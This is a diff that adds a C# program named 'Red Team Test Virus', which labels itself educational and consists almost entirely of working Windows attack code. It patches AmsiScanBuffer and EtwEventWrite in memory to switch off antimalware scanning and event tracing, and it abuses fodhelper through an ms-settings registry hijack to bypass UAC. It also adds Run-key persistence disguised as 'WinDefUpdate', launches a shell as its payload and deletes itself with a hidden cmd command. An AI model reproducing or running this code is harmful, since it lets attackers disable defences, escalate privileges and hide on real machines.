@@ -1,0 +1,190 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+using System.Security.Principal;
+
+namespace RedTeamTestVirus
+{
+    class Program
+    {
+        // --- Native Methods ---
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        // --- AMSI Bypass ---
+        static bool BypassAMSI()
+        {
+            try
+            {
+                var hModule = LoadLibrary("amsi.dll");
+                if (hModule == IntPtr.Zero) return false;
+                var addr = GetProcAddress(hModule, "AmsiScanBuffer");
+                if (addr == IntPtr.Zero) return false;
+                uint oldProtect;
+                if (!VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect)) return false;
+                Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"AMSI Bypass failed: {ex.Message}");
+                return false;
+            }
+        }
+
+        // --- ETW Bypass ---
+        static bool BypassETW()
+        {
+            try
+            {
+                var ntdll = LoadLibrary("ntdll.dll");
+                if (ntdll == IntPtr.Zero) return false;
+                var addr = GetProcAddress(ntdll, "EtwEventWrite");
+                if (addr == IntPtr.Zero) return false;
+                uint oldProtect;
+                if (!VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect)) return false;
+                Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1);
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"ETW Bypass failed: {ex.Message}");
+                return false;
+            }
+        }
+
+        // --- Persistence ---
+        static bool AddPersistence()
+        {
+            try
+            {
+                string exePath = Assembly.GetExecutingAssembly().Location;
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
+                {
+                    key.SetValue("WinDefUpdate", exePath);
+                }
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"Persistence failed: {ex.Message}");
+                return false;
+            }
+        }
+
+        // --- UAC Bypass (Fodhelper, for demonstration only) ---
+        static bool UACBypass()
+        {
+            string exePath = Assembly.GetExecutingAssembly().Location;
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command"))
+                {
+                    key.SetValue("", exePath, RegistryValueKind.String);
+                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                }
+                Process.Start("fodhelper.exe");
+                System.Threading.Thread.Sleep(3000);
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"UAC Bypass failed: {ex.Message}");
+                return false;
+            }
+        }
+
+        // --- Cleanup ---
+        static void SelfDelete()
+        {
+            try
+            {
+                string exePath = Assembly.GetExecutingAssembly().Location;
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    key?.DeleteValue("WinDefUpdate", false);
+                }
+                string cmd = $"/C timeout 3 & del \"{exePath}\"";
+                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", cmd)
+                {
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                Process.Start(psi);
+            }
+            catch (Exception ex)
+            {
+                Log($"Self-delete failed: {ex.Message}");
+            }
+        }
+
+        // --- Simulated Payload ---
+        static void RunPayload()
+        {
+            try
+            {
+                Log("Running payload (simulated)...");
+                Process.Start("cmd.exe");
+            }
+            catch (Exception ex)
+            {
+                Log($"Payload failed: {ex.Message}");
+            }
+        }
+
+        // --- Logging (for demonstration) ---
+        static void Log(string message)
+        {
+            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
+        }
+
+        // --- Check for admin privileges ---
+        static bool IsRunAsAdmin()
+        {
+            using (var identity = WindowsIdentity.GetCurrent())
+            {
+                var principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
+
+        // --- Main ---
+        static void Main(string[] args)
+        {
+            Log("Starting Red Team Test Virus (Educational)");
+
+            bool amsiBypassed = BypassAMSI();
+            bool etwBypassed = BypassETW();
+
+            Log($"AMSI Bypassed: {amsiBypassed}");
+            Log($"ETW Bypassed: {etwBypassed}");
+
+            if (!IsRunAsAdmin())
+            {
+                Log("Not running as admin, attempting UAC bypass...");
+                if (!UACBypass())
+                    Log("UAC bypass failed or not supported on this system.");
+                return;
+            }
+
+            Log("Running as admin.");
+
+            if (AddPersistence())
+                Log("Persistence added.");
+            else
+                Log("Failed to add persistence.");
+
+            RunPayload();
+            SelfDelete();
+        }
+    }
+}
